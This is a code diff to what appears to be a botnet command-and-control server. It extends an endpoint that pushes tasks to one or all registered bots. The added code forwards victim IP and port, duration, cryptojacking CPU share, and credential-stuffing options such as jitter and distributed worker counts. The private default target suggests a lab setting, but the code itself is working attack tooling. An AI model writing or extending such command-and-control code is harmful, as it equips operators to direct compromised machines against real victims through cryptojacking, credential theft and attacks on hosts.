@@ -206,18 +206,41 @@ def list_bots():
 def push_task():
     """
     Push encrypted task to one or all bots.
-    Body: {"bot_id": "all"|"<id>", "type": "...", "target_ip": "...",
-           "target_port": 80, "duration": 10}
+
+    Required fields:
+      bot_id      : "all" or a specific bot_id string
+      type        : task type (see below)
+
+    Common optional fields (passed through verbatim to the bot):
+      target_ip   : victim IP          (default 192.168.100.20)
+      target_port : victim port        (default 80)
+      duration    : seconds            (default 10)
+
+    Type-specific optional fields (forwarded to bot unchanged):
+      cpu         : float 0-1          cryptojack CPU fraction (default 0.25)
+      mode        : "bot"|"jitter"|"distributed"  cred_stuffing mode (default "jitter")
+      jitter      : int ms             cred_stuffing jitter std-dev (default 200)
+      workers     : int                cred_stuffing distributed threads (default 3)
+
+    All fields present in the request body are passed through to the task dict
+    so bots always receive the full parameterisation the operator intended.
     """
     data   = request.get_json()
     bot_id = data.get("bot_id", "all")
-    task   = {
+
+    # Base fields
+    task = {
         "type":        data.get("type", "idle"),
         "target_ip":   data.get("target_ip", "192.168.100.20"),
         "target_port": data.get("target_port", 80),
         "duration":    data.get("duration", 10),
         "issued_at":   datetime.now().isoformat(),
     }
+
+    # Pass through all type-specific optional fields if present
+    for field in ("cpu", "mode", "jitter", "workers"):
+        if field in data:
+            task[field] = data[field]
     with lock:
         targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
         for tid in targets:
